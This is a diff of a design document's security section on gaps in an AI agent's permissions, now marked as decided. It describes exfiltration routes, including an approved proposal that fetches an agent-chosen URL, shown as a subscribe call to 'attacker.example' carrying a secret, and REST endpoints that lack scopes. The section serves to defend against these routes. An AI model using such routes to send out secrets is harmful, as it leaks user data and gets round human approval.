@@ -148,7 +148,7 @@ Don't promise universal undo. Say which actions can be reverted, which cancelled
 
 ### Open gaps
 
-[The ninth review](raw/r6-security.md) found these, and they aren't closed yet. The first two are exits.
+[The ninth review](raw/r6-security.md) found these. The first two are exits. [All six are now decided](decisions.md#agents).
 
 - **Proposals.** Approving `propose_subscription` fetches a URL the agent chose, so `subscribe("https://attacker.example/?secret=...")` returns behind one click. Proposed tokens and webhooks would carry agent-chosen scopes and destinations. Either a proposal can't carry a URL or destination and you enter it yourself, or approval shows it in full as untrusted. No review screen is specified yet.
 - **Endpoints without a scope.** Agent scopes are defined for the MCP tools; the REST endpoints name none. `/v1/devices` is the worst, since a push endpoint is a destination the server posts to. `/v1/changes`, `/v1/events`, `/v1/opml`, `/v1/export`, `GET /v1/notifications` and `/v1/activity` name no scope or allowlist filter either. Deny agent tokens by default, and keep device registration yours only, like webhooks.
